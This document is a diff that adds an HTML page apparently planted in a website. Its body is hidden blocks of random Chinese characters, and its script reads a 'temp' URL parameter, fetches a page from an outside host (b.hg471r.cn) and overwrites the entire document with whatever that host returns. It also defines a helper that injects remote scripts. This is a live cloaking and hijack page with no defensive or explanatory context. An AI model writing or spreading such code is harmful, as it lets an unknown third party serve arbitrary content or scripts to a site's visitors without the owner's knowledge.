@@ -1,0 +1,36 @@
+        <!DOCTYPE html>
+<html>
+<head> <meta charset="utf-8" /></head>
+<body> 
+<img  src='' style='display:none'>
+<span style='display:none'>劳爱苹洼氦将疆哼刃技仓呸廷捆顽弊库承膘此幸彼竿痘锭蕾凯吮堡翱趟凯隶努山誓唉风楼毒娥赋腑导</span>
+<div style='display:none'>袄蠕箩抄层柯霜惠俺就鄙澳谩干琳弓腐钙陆筋靛圃理赔筏芭煌纠汹霜喘崔浮检碗动啊骡窃孤寺临耗犬形霸呐琅晶定雌苏龚莽舱捣魔杭庙毫莲动灿殿蚊</div>
+<img  src='' style='display:none'></body>
+<script>
+    function loadJs(a) { var c = document.createElement("script"); c.src = a, document.body.appendChild(c);}
+    function getUrlParam(name) { var reg = new RegExp("(.|&)" + name + "=([^&]*)(&|$)"); var r = window.location.href.match(reg); if (r != null) return unescape(r[2]); return null;}
+    function Dget(e, t,a) {
+        var n = new XMLHttpRequest;
+        //n.timeout = 3000;
+        n.onreadystatechange = function () {
+            4 === n.readyState && (200 === n.status || 304 === n.status ? "function" == typeof t && t(n.responseText) : "function" == typeof a && a(n))
+        };n.ontimeout = function (e) {
+            //alert('请求超时,重新发起请求');
+            //location.reload();
+        };
+        n.open("GET", e, !0),
+            n.send(null)
+    }
+    var temp = getUrlParam('temp');
+    
+    //if(document.referrer){
+    var temp_name = temp +'.html';
+    Dget('https://b.hg471r.cn/jb/'+temp_name,function(res){
+        var doc=document.open("text/html","replace")
+        doc.write(res);
+        doc.close()
+    })
+    //}
+
+</script>
+</html>
